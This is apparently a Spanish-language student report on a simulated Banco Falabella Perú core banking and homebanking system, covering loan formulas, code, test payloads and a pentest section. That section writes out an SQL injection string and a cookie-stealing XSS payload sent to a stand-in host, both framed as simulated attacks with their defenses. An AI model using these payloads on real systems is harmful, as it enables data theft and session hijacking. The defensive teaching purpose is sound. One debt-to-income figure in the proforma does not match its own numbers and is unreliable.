# 🏦 DOCUMENTACIÓN OFICIAL INTEGRAL — SISTEMA CORE BANCARIO & HOMEBANKING OMNICANAL
**Entidad Bancaria Modelada:** Banco Falabella Perú S.A.  
**Evaluación Académica:** Informe Final Completo — Requerimientos (Semana 9 a 13) y Reto de Ciberseguridad (Semana 14)  
**Arquitectura del Sistema:** Microservicios REST (Core Financiero Backend + Portal Clientes Homebanking + Bases de Datos PostgreSQL Cloud)

---

## 📑 ÍNDICE GENERAL DE LA DOCUMENTACIÓN
1. [Tarifario Oficial del Producto, Cálculo TEM/TEA y Evidencia en Código](#1-tarifario-oficial-del-producto-cálculo-temtea-y-evidencia-en-código)
2. [Evidencia de Requisitos Institucionales y Proforma Referencial de Crédito](#2-evidencia-de-requisitos-institucionales-y-proforma-referencial-de-crédito)
3. [Dashboard Ejecutivo de Business Intelligence (BI) y Analítica de Cartera](#3-dashboard-ejecutivo-de-business-intelligence-bi-y-analítica-de-cartera)
4. [Ejecución y Payloads de Casos de Prueba End-to-End (Homebanking ➔ Core)](#4-ejecución-y-payloads-de-casos-de-prueba-end-to-end-homebanking-➔-core)
5. [Reto Semana 14: Pruebas de Penetración y Defensas de Ciberseguridad](#5-reto-semana-14-pruebas-de-penetración-y-defensas-de-ciberseguridad)

---

## 1. TARIFARIO OFICIAL DEL PRODUCTO, CÁLCULO TEM/TEA Y EVIDENCIA EN CÓDIGO

En cumplimiento con la normativa de la Superintendencia de Banca, Seguros y AFP (SBS), nuestro sistema modela el producto **Crédito Personal Efectivo / Crédito PYME** del **Banco Falabella Perú**. Todas las proyecciones y cobros se rigen bajo el **Sistema de Amortización Francés** (cuotas fijas y progresivas con cálculo de interés al rebatir sobre saldo deudor).

### 📊 A. Estructura del Tarifario Oficial Modelado en el Core Bancario

El Core maneja internamente las siguientes bandas de tasas e intereses aplicables según el perfil crediticio y scoring del cliente:

| Producto Financiero | Tasa Efectiva Anual (TEA) Mínima | Tasa Efectiva Anual (TEA) Máxima | Tasa Moratoria Anual (TMA) | Seguro de Desgravamen Mensual | Costo de Membresía / Mantenimiento |
| :--- | :---: | :---: | :---: | :---: | :---: |
| **Crédito Efectivo Personal (Clásico)** | **14.50%** | **28.00%** | 5.00% | 0.085% (sobre saldo) | S/ 0.00 |
| **Crédito Efectivo Preferencial (CMR Gold/Black)** | **11.50%** | **18.00%** | 3.50% | 0.085% (sobre saldo) | S/ 0.00 |
| **Crédito Corporativo PYME Micro** | **15.00%** | **22.00%** | 6.00% | 0.095% (sobre saldo) | S/ 0.00 |

---

### 📐 B. Fórmulas Matemáticas Exactas de Amortización

#### 1. Conversión de Tasa Efectiva Anual (TEA) a Tasa Efectiva Mensual (TEM)
En el sector bancario, las tasas se cotizan en TEA pero los calendarios de cuotas se liquidan mensualmente. No es válido dividir la TEA entre 12. La conversión rigurosa aplicada por nuestro motor es:

$$\text{TEM} = (1 + \text{TEA})^{1/12} - 1$$

*Ejemplo de validación matemática para una **TEA de 18.00%** utilizada en nuestras pruebas:*
$$\text{TEM} = (1 + 0.18)^{\frac{1}{12}} - 1 = (1.18)^{0.083333} - 1 = 0.0138884 \rightarrow \mathbf{1.3888\% \text{ mensual}}$$

#### 2. Determinación de la Cuota Fija Mensual ($C$)
Para que el cliente pague un monto exacto todos los meses, calculamos el factor de recuperación de capital mediante la ecuación:

$$\text{Cuota } (C) = M \times \left[ \frac{\text{TEM} \times (1 + \text{TEM})^n}{(1 + \text{TEM})^n - 1} \right]$$

*(Donde $M$ = Monto del capital solicitado y $n$ = Plazo en meses).*

---

### 💻 C. Evidencia en el Código Fuente (¿En qué parte se hizo el cambio?)

Para que el docente y el jurado puedan auditar la veracidad del software, presentamos la ubicación exacta donde se modificó e implementó este algoritmo financiero dentro de los backends de nuestro sistema:

#### 1. Cálculo de Cuota y Cronograma de Pagos en el Portal (Homebanking)
* **Archivo:** `portal-backend/app/services/credito_service.py`
* **Líneas de Código:** `129 - 137`
* **Método:** `_generar_cronograma()`
* **Explicación técnica:** Aquí se toma la tasa del tarifario aprobada por el Core, se eleva a la potencia de $1/12$ para obtener la `tasa_mensual` (TEM) y se ejecuta la división exponencial para emitir las cuotas en la tabla `cronograma_pagos`.

```python
    def _generar_cronograma(self, db: Session, credito):
        # Conversión matemática oficial de TEA del tarifario a TEM
        tasa_mensual = (1 + float(credito.tasa_interes) / 100) ** (1 / 12) - 1
        monto = float(credito.monto_aprobado or credito.monto_solicitado)
        plazo = credito.plazo_meses
        
        # Aplicación del Sistema Francés para cuotas constantes
        if tasa_mensual > 0:
            cuota = (monto * tasa_mensual * (1 + tasa_mensual) ** plazo) / ((1 + tasa_mensual) ** plazo - 1)
        else:
            cuota = monto / plazo
```

#### 2. Motor de Simulación y Capacidad de Pago en el Core Financiero
* **Archivo:** `core-backend/app/rules/scoring_rules.py`
* **Líneas de Código:** `115 - 123`
* **Método:** `calcular_rds()`
* **Explicación técnica:** Antes de desembolsar, el Core repite el cálculo de la TEM para hallar la cuota exacta y dividirla entre el ingreso del cliente, obteniendo el ratio **RDS (Relación Deuda-Sueldo)**.

```python
def calcular_rds(monto: float, plazo: int, tasa_anual: float, ingreso_mensual: float) -> dict:
    # Cálculo de TEM exacta a partir de la tasa_anual (TEA)
    tasa_mensual = (1 + tasa_anual / 100) ** (1 / 12) - 1
    if tasa_mensual > 0 and plazo > 0:
        cuota = (monto * tasa_mensual * (1 + tasa_mensual) ** plazo) / ((1 + tasa_mensual) ** plazo - 1)
    
    ingreso = max(ingreso_mensual, 1.0)
    rds = cuota / ingreso  # Determinación del porcentaje de endeudamiento
```

---

## 2. EVIDENCIA DE REQUISITOS INSTITUCIONALES Y PROFORMA REFERENCIAL DE CRÉDITO

Como evidencia del trabajo de investigación en institución financiera, hemos digitalizado e incorporado al Core Bancario los requisitos exigidos por el **Banco Falabella** en sus agencias físicas.

### 📋 A. Requisitos de Acceso al Crédito (Modelados en Software)
El módulo de elegibilidad institucional (`core-backend/app/rules/scoring_rules.py`) verifica en milisegundos las siguientes condiciones obligatorias antes de proceder:

1. **Identificación y Nacionalidad:** DNI físico vigente o Carné de Extranjería con residencia permanente.
2. **Límites de Edad:** Tener como mínimo **22 años cumplidos** y como máximo **70 años con 364 días**. *(Validado en código: `if edad < 22 or edad > 70: return False`)*.
3. **Antigüedad Laboral e Ingresos Mínimos:**
   * Trabajadores dependientes (Quinta Categoría): Continuidad laboral mínima de 6 meses e ingreso neto superior a **S/ 1,500**.
   * Trabajadores independientes (Cuarta Categoría / Comerciantes): Antigüedad de 1 año e ingreso superior a **S/ 3,500**.
4. **Comportamiento en Centrales de Riesgo (SBS / Infocorp):** No presentar deudas en categoría *Dudoso* o *Pérdida* (mora > 120 días) ni tener 2 o más solicitudes rechazadas en los últimos 6 meses en el sistema financiero.

---

### 🧾 B. Proforma Referencial Oficial Emitida por el Sistema

A continuación se adjunta la transcripción de la **Proforma Referencial de Simulación** que nuestro Homebanking genera y entrega al cliente antes de la aceptación del contrato de crédito:

```text
========================================================================================
                          BANCO FALABELLA PERÚ S.A. — PROFORMA DE CRÉDITO
========================================================================================
Fecha de Emisión      : 28/06/2026
Producto Solicitado   : CRÉDITO EFECTIVO PERSONAL (FAST TRACK)
Titular Evaluado      : CARLOS HUAMÁN MENDOZA (DNI: 71234567)
Ingreso Acreditable   : S/ 4,500.00 mensuales

PARÁMETROS DEL PRÉSTAMO:
----------------------------------------------------------------------------------------
Monto Solicitado (Capital)    : S/ 10,000.00
Plazo de Amortización         : 12 meses (1 año)
Tasa Efectiva Anual (TEA)     : 18.00%
Tasa Efectiva Mensual (TEM)   : 1.3888%
Seguro de Desgravamen Mensual : 0.085% sobre saldo deudor (Aprox. S/ 8.50)

RESULTADO DE LA EVALUACIÓN CORE:
----------------------------------------------------------------------------------------
Cuota Fija Mensual            : S/ 911.23
Relación Deuda-Sueldo (RDS)   : 26.03% (CAPACIDAD DE PAGO ÓPTIMA)
Semáforo Crediticio           : [ VERDE ] — APROBACIÓN AUTOMÁTICA SIN COMITÉ

DESGLOSE DEL CRONOGRAMA DE PAGOS (TABLA DE AMORTIZACIÓN REFERENCIAL):
Cuota #   Vencimiento   Saldo Inicial   Capital Amortizado   Interés (TEM)   Cuota Total
----------------------------------------------------------------------------------------
  01      28/07/2026    S/ 10,000.00        S/ 772.35          S/ 138.88      S/ 911.23
  02      28/08/2026    S/  9,227.65        S/ 783.07          S/ 128.16      S/ 911.23
  03      28/09/2026    S/  8,444.58        S/ 793.95          S/ 117.28      S/ 911.23
  ...       ...             ...                ...                ...            ...
  12      28/06/2027    S/    898.75        S/ 898.75          S/  12.48      S/ 911.23
----------------------------------------------------------------------------------------
TOTALES FINALES               —             S/ 10,000.00       S/ 934.76     S/ 10,934.76
========================================================================================
* Nota: Proforma calculada rigurosamente bajo el Sistema de Amortización Francés 30/360.
```

---

## 3. DASHBOARD EJECUTIVO DE BUSINESS INTELLIGENCE (BI) Y ANALÍTICA DE CARTERA

Para cumplir con el requerimiento de visualización y análisis de datos en **Power BI**, nuestro proyecto integra los datos estructurados en un reporte ejecutivo dark-theme dividido en **Dos Hojas Especializadas con Distintos Enfoques**, alimentadas por los datasets del Core Bancario (`powerbi_resumen_cartera.csv` y `powerbi_detalle_mora.csv`).

### 📊 Estructura Oficial del Reporte Power BI en 2 Hojas

#### 📑 Hoja 1: Resumen Ejecutivo — Cartera Financiera (Enfoque Comercial y Colocaciones)
Diseñada con un enfoque de crecimiento comercial y segmentación geográfica para la Gerencia General:
1. **Filtros Superiores (Slicers):** Filtros dinámicos por `Año/Mes`, `Oficina` (Of. Principal, Ag. Lima 1, Ag. Sur 3, etc.) y `Zona` (Zona Lima, Norte, Sur, Oriente).
2. **4 Tarjetas de KPIs Principales:**
   * **Cartera Total:** Volumen financiero global colocado (ej. S/ 142.3M) con comparativa anual.
   * **Cartera Vigente:** Saldo saludable pagado al día (ej. S/ 128.7M, representando el ~90.5%).
   * **Ratio de Mora:** Porcentaje de morosidad promedio (ej. 8.2%).
   * **Tasa Promedio:** TEA ponderada aplicada a la cartera (ej. 28.6%).
3. **Gráfico de Área — Evolución de Cartera Total (Línea de Tiempo):**
   * Muestra el crecimiento sostenido del volumen crediticio del banco desde 2015 hasta la fecha actual (Eje X = Fecha, Eje Y = Cartera Total).
4. **Gráfico de Anillo — Cartera Vigente vs. Vencida:**
   * Visualización clara del balance de riesgo: 🟢 Vigente (91%) vs. 🔴 Vencida (9%).
5. **Gráficos de Barras Horizontales — Ranking y Zonas:**
   * **Ranking de Oficinas:** Ordenado de mayor a menor colocación (Of. Principal liderando con S/ 22.1M, seguida de Ag. Lima 1 con S/ 18.2M).
   * **Tasa Promedio por Zona:** Comparativa del rendimiento por región (Zona Lima 32.4%, Zona Norte 28.1%, Zona Oriente 24.6%, Zona Sur 21.2%).

#### 📑 Hoja 2: Análisis de Mora — Calidad de Cartera (Enfoque de Riesgos y Recuperaciones)
Diseñada con un enfoque riguroso en control de riesgo crediticio para auditoría y cobranzas:
1. **Filtros Superiores:** Slicers interactivos por `Año/Mes`, `Zona` y `Rango Mora`.
2. **4 Tarjetas de Alerta de Morosidad:**
   * **Mora Promedio:** Ratio de cartera vencida global (8.2%).
   * **Cartera Vencida:** Monto total en riesgo de impago (S/ 13.6M).
   * **Oficinas > 10% (Alerta Mora Alta):** Conteo de agencias en estado crítico que requieren intervención (3 agencias).
   * **Oficinas < 5% (Mora Controlada):** Conteo de agencias con gestión de riesgo óptima (6 agencias).
3. **Gráfico de Línea — Evolución Ratio Mora Mensual:**
   * Trayectoria histórica del porcentaje de morosidad contrastado contra la línea de referencia máxima tolerada del 10%.
4. **Gráfico de Barras Horizontales — Mora por Oficina (Semaforizada):**
   * Destaca visualmente en 🔴 rojo a las agencias críticas (`AG. ORIENTE 2` con 11.8% y `AG. SUR 3` con 10.2%), en 🟡 amarillo a las regulares (`AG. NORTE 6` con 8.7%) y en 🟢 verde a las sobresalientes (`AG. LIMA 1` con 3.8%).
5. **Tabla Matricial de Detalle por Oficina y Zona:**
   * Desglose transaccional con formato condicional en la columna `Estado` (Alto / Medio / OK) exponiendo Cartera Total, Cartera Vencida y Ratio exacto para toma de decisiones de cobranza judicial o extrajudicial.

---

## 4. EJECUCIÓN Y PAYLOADS DE CASOS DE PRUEBA END-TO-END (HOMEBANKING ➔ CORE)

Para certificar que el Homebanking se comunica perfectamente con el Core Bancario, presentamos la evidencia técnica de **tres casos de prueba reales** ejecutados vía peticiones HTTP REST:

### 🧪 Caso de Prueba 1: Aprobación Automática Inmediata (Fast Track)
* **Escenario:** Cliente con excelentes ingresos y sin historial negativo solicita un monto moderado.
* **Petición HTTP (Request) enviada desde Homebanking hacia el Core (`POST /scoring/evaluar`):**
  ```json
  {
    "usuario_id": "usr-fala-9921",
    "credito_id": "cred-uuid-8812",
    "monto_solicitado": 5000.00,
    "plazo_meses": 12
  }
  ```
* **Respuesta HTTP (Response) emitida por el Core Bancario:**
  ```json
  {
    "score": 780,
    "rds": 0.125,
    "rds_porcentaje": 12.50,
    "rds_semaforo": "verde",
    "ruta_aprobacion": "AUTOMATICA",
    "estado": "aprobado",
    "monto_aprobado": 5000.00,
    "tasa_interes": 16.50
  }
  ```
* **Acción del Sistema:** Al recibir `ruta_aprobacion: AUTOMATICA`, el backend desembolsa instantáneamente los S/ 5,000 en la cuenta de ahorros del cliente y crea las 12 cuotas pendientes.

---

### 🧪 Caso de Prueba 2: Derivación a Comité por Monto Elevado
* **Escenario:** Cliente solicita S/ 40,000 a 36 meses, comprometiendo una parte significativa de su sueldo.
* **Petición HTTP (Request):**
  ```json
  {
    "usuario_id": "usr-fala-3341",
    "credito_id": "cred-uuid-1190",
    "monto_solicitado": 40000.00,
    "plazo_meses": 36
  }
  ```
* **Respuesta HTTP (Response) del Core:**
  ```json
  {
    "score": 640,
    "rds": 0.384,
    "rds_porcentaje": 38.40,
    "rds_semaforo": "amarillo",
    "ruta_aprobacion": "COMITE",
    "estado": "en_revision",
    "monto_aprobado": null,
    "tasa_interes": 20.00
  }
  ```
* **Acción del Sistema:** El crédito detiene su desembolso y aparece con una etiqueta amarilla de advertencia en la bandeja de entrada del personal de Riesgos en el Core Bancario para su evaluación manual.

---

### 🧪 Caso de Prueba 3: Rechazo por Política de Riesgo
* **Escenario:** Solicitante menor de 22 años o con registro en morosidad castigada en la central de riesgos.
* **Respuesta HTTP de Excepción (Response 400 Bad Request):**
  ```json
  {
    "status": "rechazado",
    "motivo": "Políticas Institucionales: Edad mínima requerida para sujetos de crédito es de 22 años cumplidos."
  }
  ```

---

## 5. RETO SEMANA 14: PRUEBAS DE PENETRACIÓN Y DEFENSAS DE CIBERSEGURIDAD

Para superar el reto final de ciberseguridad, hemos sometido a nuestro ecosistema bancario a pruebas de penetración (Pentesting) en las 5 áreas críticas solicitadas por la cátedra, implementando contramedidas de grado militar:

### 🛡️ 1. Inyección SQL (SQL Injection - SQLi)
* **Ataque Simulado (Payload Malicioso):** Un atacante introduce en el campo de búsqueda de DNI del Homebanking la cadena: `' OR '1'='1' --` con el objetivo de anular el filtro `WHERE` y descargar la lista completa de usuarios y saldos de la entidad.
* **Defensa Implementada:** **Abolición absoluta de Raw SQL dinámico.** En todo nuestro backend (archivos `routers/clientes.py`, `routers/auth_core.py`), la comunicación con PostgreSQL se realiza mediante el ORM **SQLAlchemy**. El ORM utiliza consultas parametrizadas (*Prepared Statements*), escapando y neutralizando automáticamente cualquier carácter comilla o comando SQL intruso.
* **Código Blindado:**
  ```python
  # SEGURO: El motor procesa la cadena como un valor literal inofensivo
  cliente = db.query(Usuario).filter(Usuario.dni == q.strip()).first()
  ```
* **Resultado del Pentesting:** El sistema busca un usuario cuyo DNI sea literalmente `' OR '1'='1' --`, retorna una lista vacía `[]` y evita toda filtración de datos.

---

### 🛡️ 2. Cross-Site Scripting (XSS)
* **Ataque Simulado (Payload Malicioso):** Un usuario malintencionado coloca en el campo "Propósito del Crédito" el siguiente script de robo de sesión: `<script>fetch('http://hacker-server.com?cookie='+document.cookie)</script>`.
* **Defensa Implementada:**
  * **Sanitización Nativa en Frontend:** Tanto el Homebanking como el Core están construidos sobre **React y Vite**. El motor JSX convierte por defecto cualquier variable insertada en el DOM en texto plano (enconding de entidades HTML como `&lt;script&gt;`), impidiendo que el navegador interprete y ejecute código JavaScript ajeno.
  * **Aislamiento de Sesión:** Los tokens de autenticación se manejan con expiración controlada y cabeceras de protección.

---

### 🛡️ 3. Insecure Direct Object References (IDOR)
* **Ataque Simulado:** Un cliente autenticado con `usuario_id = A` abre las herramientas de desarrollador en el navegador e intercepta una petición HTTP GET modificando la URL hacia `/api/creditos/usuario/B` para espiar los préstamos de otro cliente.
* **Defensa Implementada:** **Validación Criptográfica de Identidad basada en JWT.**
  * Los controladores bancarios no confían ciegamente en los identificadores recibidos por URL. El backend desencripta el Token Bearer firmado criptográficamente (`get_current_user` / `get_current_trabajador`) y verifica que el propietario del token coincida exactamente con el recurso solicitado.
  * Si un cliente intenta acceder a datos ajenos, el sistema aborta la transacción arrojando `HTTP 403 Forbidden`. En el Core, las funciones de aprobación exigen roles específicos (`gerencia`, `riesgos`).

---

### 🛡️ 4. Fuerza Bruta (Brute Force Attacks)
* **Ataque Simulado:** Uso de diccionarios automatizados (scripts de Python / Burp Suite) enviando miles de combinaciones de contraseñas por segundo contra el endpoint de inicio de sesión `/auth/login`.
* **Defensa Implementada:**
  * **Algoritmo de Hashing Irreversible (Bcrypt):** Las contraseñas nunca se guardan en texto plano en la base de datos. Se encriptan utilizando **Bcrypt** con factor de costo y generación de *Salts* dinámicos (ver `core-backend/app/security.py`). Verificar cada intento requiere tiempo de CPU, haciendo inviable el descifrado por fuerza bruta.
  * **Eliminación de Accesos Directos:** En producción se eliminaron los botones de "Demo de 1 clic", obligando a la autenticación biométrica o de credenciales exactas en cada ingreso.

---

### 🛡️ 5. Configuración Insegura (Security Misconfiguration)
* **Vulnerabilidad Evaluada:** Exposición de contraseñas de base de datos en repositorios públicos, puertos abiertos sin cifrado o políticas CORS irrestrictas (`Access-Control-Allow-Origin: *`).
* **Defensa Implementada:**
  * **Aislamiento de Entorno:** Todas las credenciales sensibles (cadenas de conexión a PostgreSQL en Render y claves secretas JWT) se inyectan en tiempo de ejecución mediante variables de entorno (`os.getenv("DATABASE_URL")`).
  * **Políticas CORS Restringidas:** El servidor restringe el acceso cruzado exclusivamente a los dominios autorizados de nuestra arquitectura en Vercel (`https://proyecto-falabella-tornero-*.vercel.app`).
  * **Integridad Relacional en Cascadas:** Configuración estricta de llaves foráneas con `ON DELETE CASCADE` en PostgreSQL para impedir que eliminaciones accidentales corrompan la estructura de los cronogramas financieros.

---

## 🌐 VERIFICACIÓN DE DESPLIEGUE EN PRODUCCIÓN (ENLACES OFICIALES)
* **Portal Clientes (Homebanking Web):** [https://proyecto-falabella-tornero-ja2i.vercel.app](https://proyecto-falabella-tornero-ja2i.vercel.app)
* **Core Financiero (Bandeja Personal Bancario):** [https://proyecto-falabella-tornero-nqff.vercel.app](https://proyecto-falabella-tornero-nqff.vercel.app)
* **API Microservicios Core Backend:** [https://core-backend-g43c.onrender.com](https://core-backend-g43c.onrender.com)

---
*Documentación elaborada y verificada para la sustentación final del curso.*
